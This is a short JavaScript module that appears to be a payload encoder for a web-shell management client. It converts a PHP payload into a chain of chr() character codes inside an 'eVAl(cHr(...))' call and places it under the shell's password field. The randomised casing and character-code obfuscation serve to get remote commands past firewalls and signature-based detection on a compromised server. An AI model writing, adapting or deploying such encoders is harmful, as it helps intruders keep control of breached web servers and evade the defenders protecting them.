/**
 * php::chr编码器
 * ? 利用php的chr函数进行编码处理
 */

'use strict'

module.exports = (pwd, data) => {
  // 编码函数
  const encode = (php) => {
    let ret = [];
    let i = 0;
    while(i < php.length) {
      ret.push(php[i].charCodeAt());
      i ++;
    }
    return `eVAl(cHr(${ret.join(').ChR(')}));`;
  }

  // 编码并去除多余数据
  data[pwd] = encode(data._);
  delete data._;

  // 返回数据
  return data;
}
